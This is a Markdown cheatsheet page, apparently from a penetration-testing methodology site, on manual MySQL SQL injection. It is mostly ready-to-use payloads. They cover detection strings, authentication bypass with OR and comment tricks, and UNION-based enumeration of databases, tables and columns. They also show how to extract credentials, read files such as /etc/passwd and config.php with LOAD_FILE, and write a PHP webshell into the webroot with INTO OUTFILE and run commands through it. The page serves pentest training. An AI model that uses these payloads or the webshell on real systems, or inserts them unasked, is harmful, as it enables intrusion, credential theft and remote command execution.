---
title: "SQL Injection Fundamentals"
description: "UNION, error-based, blind, and manual SQLi techniques."
sidebar:
  order: 3
  label: "SQL Injection Fundamentals"
---
> Manual SQLi in MySQL: auth bypass with OR/comments, UNION-based enumeration, file read/write, and webshell.

---


## SQLi Detection

```sql
-- Payloads de detección (probar en parámetros GET/POST/Headers)
'
"
#
;
)
' OR '1'='1
' AND '1'='1
' AND '1'='2

-- URL encoded
%27  → '
%22  → "
%23  → #
```

### Vulnerability Signs

```
- SQL error en la respuesta → inyección directa
- Cambio en el resultado (más/menos datos) → boolean-based
- Comportamiento diferente → ciega (blind)
- Delay → time-based (SLEEP)
```

---

## Auth Bypass

```sql
-- OR injection en username (cuando username existe)
admin' or '1'='1
-- → SELECT * FROM logins WHERE username='admin' or '1'='1' AND password='algo'

-- OR en ambos campos (sin conocer el username)
' or '1'='1
-- password field: something' or '1'='1

-- Bypass con comentario (usuario admin conocido)
admin'-- -
-- → SELECT * FROM logins WHERE username='admin'-- ' AND password='...'

-- Si hay paréntesis
admin')-- -
-- → SELECT * FROM logins WHERE (username='admin')
```

> **Tip:** `-- -` (with a trailing space) or `-- ` are equivalent. `#` also works in MySQL. In URLs: `--+` or `%23`.

---

## Determining the Number of Columns

### ORDER BY Method (increment until error)

```sql
' order by 1-- -    → OK
' order by 2-- -    → OK
' order by 3-- -    → OK
' order by 4-- -    → ERROR  → tabla tiene 3 columnas
```

### UNION Method (add columns until no error)

```sql
' UNION select 1,2,3-- -    → ERROR: different number of columns
' UNION select 1,2,3,4-- -  → OK   → 4 columnas
```

---

## Identifying Visible Columns

```sql
-- Usar números para saber cuáles se renderizan en la página
' UNION select 1,2,3,4-- -
-- Ver qué números aparecen en la respuesta → esos son los visibles

-- Confirmar con dato real en columna visible (ej. columna 2)
' UNION select 1,@@version,3,4-- -
```

---

## MySQL Fingerprinting

```sql
' UNION select 1,@@version,3,4-- -          -- versión DB
' UNION select 1,database(),3,4-- -         -- base de datos actual
' UNION select 1,user(),3,4-- -             -- usuario actual del DBMS
' UNION select 1,@@datadir,3,4-- -          -- directorio de datos
' UNION select 1,SLEEP(5),3,4-- -           -- time-based blind (retraso 5s)
' UNION select 1,POW(1,1),3,4-- -           -- si solo hay output numérico
```

---

## Enumeration — INFORMATION_SCHEMA

### Listing Databases

```sql
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

-- Ignorar: information_schema, mysql, performance_schema, sys (son de sistema)
```

### Listing Tables of a DB

```sql
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES 
  where table_schema='dev'-- -
```

### Listing Columns of a Table

```sql
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA 
  from INFORMATION_SCHEMA.COLUMNS 
  where table_name='credentials'-- -
```

### Extracting Data

```sql
-- Sintaxis: db.tabla (si la DB actual es diferente a la que queremos)
' UNION select 1,username,password,4 from dev.credentials-- -

-- Concatenar dos columnas en una (si solo hay una columna visible)
' UNION select 1,concat(username,':',password),3,4 from dev.credentials-- -
```

---

## SQL Cheatsheet — Useful Queries

```sql
-- Conexión MySQL local
mysql -u root -p
mysql -u root -p<password>
mysql -u root -h 10.10.10.1 -P 3306 -p

-- Ver bases de datos / tablas
SHOW DATABASES;
USE database_name;
SHOW TABLES;
DESCRIBE tabla;

-- CRUD básico
SELECT * FROM tabla;
SELECT col1, col2 FROM tabla WHERE condicion;
SELECT * FROM tabla ORDER BY col1 DESC LIMIT 10;
SELECT * FROM tabla WHERE username LIKE 'admin%';   -- % = wildcard
SELECT * FROM tabla WHERE username LIKE '___';      -- _ = exactamente 1 char
INSERT INTO tabla(col1,col2) VALUES ('val1','val2');
UPDATE tabla SET col1='nuevo' WHERE id=1;
DELETE FROM tabla WHERE id=1;
```

---

## SQL Comments in Injection

```sql
-- MySQL comment types
-- -           → comentario de línea (necesita espacio al final)
#             → comentario de línea (URL: %23 en browser)
/**/          → comentario inline (para bypassar filtros de espacio)

-- Ejemplos
admin'-- -      → comenta el resto de la query
' UNION select 1,2-- -
' OR 1=1#
```

---

## Reading Files (requires FILE privilege)

```sql
-- Verificar usuario actual
' UNION SELECT 1,user(),3,4-- -
' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -

-- Verificar privilegios FILE
' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges 
  WHERE grantee="'root'@'localhost'"-- -

-- Leer archivo
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -

-- Verificar secure_file_priv (vacío = podemos leer/escribir todo)
' UNION SELECT 1,variable_name,variable_value,4 
  FROM information_schema.global_variables 
  WHERE variable_name="secure_file_priv"-- -
```

---

## Writing Files and Webshell

```sql
-- Verificar si podemos escribir (secure_file_priv debe estar vacío)
-- Paso 1: verificar FILE privilege y secure_file_priv (ver sección anterior)

-- Paso 2: probar escritura en webroot
' UNION select 1,'test_write',3,4 INTO OUTFILE '/var/www/html/test.txt'-- -
-- Verificar: http://target/test.txt

-- Paso 3: escribir webshell PHP
' UNION select "","<?php system($_REQUEST[0]); ?>","","" 
  INTO OUTFILE '/var/www/html/shell.php'-- -

-- Paso 4: ejecutar comandos
# http://target/shell.php?0=id
# http://target/shell.php?0=whoami
# http://target/shell.php?0=cat+/etc/passwd
```

### Default Webroot Paths

```
Linux  (Apache): /var/www/html/
Linux  (Nginx):  /usr/share/nginx/html/
Windows (Apache): C:/xampp/htdocs/
Windows (IIS):   C:/inetpub/wwwroot/

-- Leer config de servidor para encontrar webroot
' UNION SELECT 1,LOAD_FILE('/etc/apache2/apache2.conf'),3,4-- -
' UNION SELECT 1,LOAD_FILE('/etc/nginx/nginx.conf'),3,4-- -
```

---

## SQL Operators — Reference

| Operator | Description | Equivalent Symbol |
|----------|-------------|---------------------|
| `AND` | Both conditions true | `&&` |
| `OR` | At least one true | `\|\|` |
| `NOT` | Negates the condition | `!` |
| `=` `!=` `>` `<` | Comparison | — |
| `LIKE 'val%'` | Wildcard (`%`=0+chars, `_`=1 char) | — |

---

## Pitfalls / Gotchas

- **ORDER BY number > columns:** an error that reveals we exceeded the limit (useful for counting).
- **UNION different columns:** the number of columns in SELECT must be equal. Fill with numbers or NULL.
- **Invisible column:** if column 1 is not rendered on the page, place the payload in column 2 or 3.
- **Quotes in comments:** `-- -` requires a space. In URLs use `--+` or `%20`.
- **`#` in browser:** the browser interprets it as a fragment. Use `%23` in the URL.
- **Non-empty secure_file_priv:** LOAD_FILE() and INTO OUTFILE will not work. Modern MySQL blocks this by default.
- **OS write privileges:** even if MySQL has FILE privilege, the `mysql` user needs write permissions in the target directory.
- **Error not shown:** if the app does not display SQL errors, you will need blind SQLi or use sqlmap with `--technique=B`.
- **Concatenating columns:** if there is only 1 visible column, use `concat(col1,':',col2)` or `group_concat(col1)`.
- **NULL vs numbers:** use NULL to fill columns in UNION when there is data type incompatibility.

---

## Related Cheatsheets

- [SQLMap Essentials](/en/metodologias/web/sqlmap-essentials/) — SQLi automation: detection, dump, OS shell
- [Using Web Proxies](/en/metodologias/web/using-web-proxies/) — intercepting and manipulating SQL requests in Burp/ZAP
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — PHP webshell post-exploitation of SQLi
- [File Transfers](/en/metodologias/privesc/file-transfers/) — exfiltrating data from the server after compromising via SQLi
